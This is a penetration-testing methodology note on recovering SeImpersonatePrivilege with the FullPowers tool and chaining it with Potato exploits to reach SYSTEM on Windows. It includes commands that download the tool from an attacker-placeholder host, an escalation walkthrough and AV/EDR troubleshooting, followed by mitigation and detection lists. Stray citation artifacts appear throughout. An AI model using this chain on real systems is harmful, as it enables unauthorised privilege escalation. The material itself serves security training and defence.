## Overview

Some Windows services run as built-in service accounts such as:

```text
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
```

These accounts normally have a default set of privileges, but some service processes may run with a restricted token. This can remove useful privileges such as `SeImpersonatePrivilege`, making Potato-style privilege escalation more difficult.

`FullPowers` is a tool by itm4n that can recover the default privilege set for `LOCAL SERVICE` or `NETWORK SERVICE` contexts. The GitHub project describes it as a way to recover the default privilege set of a service account, and itm4n’s research explains that some services running as `LOCAL SERVICE` or `NETWORK SERVICE` may be configured with restricted privileges. :contentReference[oaicite:0]{index=0}

The general methodology is:

```text
Gain code execution as LOCAL SERVICE or NETWORK SERVICE
↓
Check current privileges
↓
Identify missing SeImpersonatePrivilege
↓
Run FullPowers
↓
Spawn a new process with restored service-account privileges
↓
Confirm SeImpersonatePrivilege is present
↓
Chain with Potato-style privilege escalation
↓
Obtain NT AUTHORITY\SYSTEM
```

---

# Why This Matters

Many Windows local privilege escalation techniques rely on token impersonation.

A key privilege is:

```text
SeImpersonatePrivilege
```

Microsoft describes this as the user right to “Impersonate a client after authentication.” :contentReference[oaicite:1]{index=1}

If a compromised service account is missing `SeImpersonatePrivilege`, Potato-style attacks may fail.

Restoring the default service-account privilege set can make the account usable for impersonation-based escalation again.

---

# Common Scenario

You have a shell as:

```text
nt authority\local service
```

or:

```text
nt authority\network service
```

But `whoami /priv` shows a restricted token.

Example problem:

```text
SeImpersonatePrivilege    missing
```

or:

```text
SeImpersonatePrivilege    Disabled
```

This may prevent tools such as:

```text
JuicyPotato
PrintSpoofer
RoguePotato
GodPotato
SweetPotato
```

from working as expected.

# Tool – FullPowers

## Repository

```text
https://github.com/itm4n/FullPowers
```

Purpose:

```text
Recover the default privilege set of LOCAL SERVICE or NETWORK SERVICE.
```

> [!important]
> `FullPowers` should be run from a `LOCAL SERVICE` or `NETWORK SERVICE` context. It is not a general-purpose privilege escalation tool by itself.

The usual purpose is to restore privileges first, then use another technique such as a Potato-style attack to escalate to `NT AUTHORITY\SYSTEM`.

---

# When to Use FullPowers

Use this technique when:

```text
You have execution as LOCAL SERVICE or NETWORK SERVICE
whoami /priv shows a restricted privilege set
SeImpersonatePrivilege is missing or unavailable
Potato-style exploits fail because impersonation privileges are absent
You need to recover the service account’s default token privileges
```

Do not use it when:

```text
You are already a normal user account
You are already local administrator
You already have a full token with SeImpersonatePrivilege
You are not running as LOCAL SERVICE or NETWORK SERVICE
```

# 1. Confirm Current Identity

```cmd
whoami
```

Expected useful contexts:

```text
nt authority\local service
```

```text
nt authority\network service
```

Check groups:

```cmd
whoami /groups
```

Check privileges:

```cmd
whoami /priv
```

---

# 2. Identify Restricted Token

A restricted service token may show only a small number of privileges.

Check for:

```text
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
```

High-value finding:

```text
SeImpersonatePrivilege is missing
```

or:

```text
SeImpersonatePrivilege is not enabled
```

This indicates that a direct Potato-style attack may not work until privileges are restored.

---

# 3. Upload FullPowers

Upload the binary to a writable directory.

Common writable paths:

```text
C:\Windows\Temp
C:\Users\Public
C:\ProgramData
```

Example:

```cmd
cd C:\Windows\Temp
```

If using PowerShell:

```powershell
iwr http://<attacker_ip>/FullPowers.exe -OutFile C:\Windows\Temp\FullPowers.exe
```

Using `certutil`:

```cmd
certutil -urlcache -f http://<attacker_ip>/FullPowers.exe C:\Windows\Temp\FullPowers.exe
```

---

# 4. Run FullPowers

Basic execution:

```cmd
C:\Windows\Temp\FullPowers.exe
```

Expected behavior:

```text
A new process is spawned with the restored default privilege set.
```

Public examples show output similar to:

```text
[+] Started dummy thread
[+] Successfully created scheduled task.
[+] Got new token!
[+] CreateProcessAsUser() OK
```

Community privilege escalation references also show FullPowers restoring a service account token and spawning a process with more privileges. :contentReference[oaicite:2]{index=2}

---

# 5. Confirm Restored Privileges

Inside the new process spawned by FullPowers, run:

```cmd
whoami
```

```cmd
whoami /priv
```

Look for:

```text
SeImpersonatePrivilege
```

Example target state:

```text
SeImpersonatePrivilege    Enabled
```

or present and usable.

> [!important]
> The key goal is not merely running FullPowers. The key goal is confirming the new process has the privileges needed for the next escalation step.

---

# 6. Chain with Potato-Style Privilege Escalation

Once `SeImpersonatePrivilege` is present, use an appropriate Potato-style technique for the target OS and environment.

Examples:

```text
JuicyPotato
PrintSpoofer
RoguePotato
GodPotato
SweetPotato
```

The flow becomes:

```text
LOCAL SERVICE shell with restricted token
↓
Run FullPowers
↓
New LOCAL SERVICE process with restored privileges
↓
Confirm SeImpersonatePrivilege
↓
Run Potato-style exploit
↓
SYSTEM shell
```

# Practical Decision Tree

## Are You LOCAL SERVICE or NETWORK SERVICE?

Check:

```cmd
whoami
```

If yes, continue.

If no, FullPowers is probably not the right technique.

---

## Is SeImpersonatePrivilege Missing?

Check:

```cmd
whoami /priv
```

If missing or unavailable, run FullPowers.

If already present, go directly to the appropriate Potato-style attack.

---

## Did FullPowers Spawn a New Process?

If yes, check privileges again in that new process.

```cmd
whoami /priv
```

If `SeImpersonatePrivilege` appears, continue to Potato-style escalation.

---

## Does the Potato Attack Work?

If yes:

```text
SYSTEM access achieved
```

If no, check:

```text
OS version
Potato variant compatibility
firewall / COM conditions
privilege state
EDR/AV blocking
payload path
listener connectivity
```

# Troubleshooting

## FullPowers Does Not Restore Privileges

Check:

```text
Are you running as LOCAL SERVICE or NETWORK SERVICE?
Is the binary blocked by AV/EDR?
Is the OS behavior compatible?
Did it spawn a new process?
Are you checking privileges in the new process?
```

---

## SeImpersonatePrivilege Still Missing

Try:

```text
run from a different shell context
run from the actual service context
check whether the service account is heavily restricted
confirm you are not inside an unusual container/sandboxed context
```

---

## Potato Exploit Fails After FullPowers

Check:

```text
SeImpersonatePrivilege is present
Potato variant matches OS version
payload path is valid
listener is running
target can reach attacker
AV/EDR did not block payload
```

---

## Payload Does Not Execute

Try a simple proof command first:

```cmd
whoami > C:\Windows\Temp\who.txt
```

Then inspect:

```cmd
type C:\Windows\Temp\who.txt
```

# Defensive Notes

## Root Cause

This technique abuses the difference between:

```text
a restricted service process token
```

and:

```text
the default privilege set normally associated with LOCAL SERVICE or NETWORK SERVICE
```

FullPowers uses Windows behavior around service accounts and scheduled task/token creation to obtain a new process with the restored default privilege set, which can then expose impersonation privileges useful for further escalation. itm4n’s write-up specifically discusses recovering lost privileges for service accounts through Task Scheduler behavior. :contentReference[oaicite:3]{index=3}

---

# Mitigations

Defensive actions:

```text
avoid exposing command execution as LOCAL SERVICE or NETWORK SERVICE
patch systems against known Potato-style escalation vectors
restrict service account privileges where possible
monitor scheduled task creation by service accounts
monitor unusual process creation from service accounts
prevent arbitrary file upload/execution in service contexts
apply least privilege to services
use modern Windows versions and patches
deploy EDR detections for token abuse and Potato-style behavior
```

---

# Detection Ideas

Monitor for:

```text
FullPowers.exe execution
LOCAL SERVICE or NETWORK SERVICE creating scheduled tasks
unexpected child cmd.exe or powershell.exe from service accounts
whoami /priv checks from service accounts
Potato exploit binaries
PrintSpoofer.exe
JuicyPotato.exe
GodPotato.exe
nc.exe launched by service accounts
```

Suspicious chain:

```text
service process
↓
FullPowers.exe
↓
new cmd.exe / powershell.exe with restored privileges
↓
Potato-style exploit
↓
SYSTEM shell
```

---

# Key Takeaways

- `LOCAL SERVICE` and `NETWORK SERVICE` may run with restricted privilege tokens.
- Missing `SeImpersonatePrivilege` can prevent Potato-style escalation.
- `FullPowers` can restore the default service-account privilege set for `LOCAL SERVICE` or `NETWORK SERVICE`.
- FullPowers is not usually the final escalation step.
- The common chain is `FullPowers` first, then a Potato-style exploit.
- Always confirm the restored privileges with `whoami /priv`.
- Once `SeImpersonatePrivilege` is available, choose a Potato variant appropriate for the target OS.
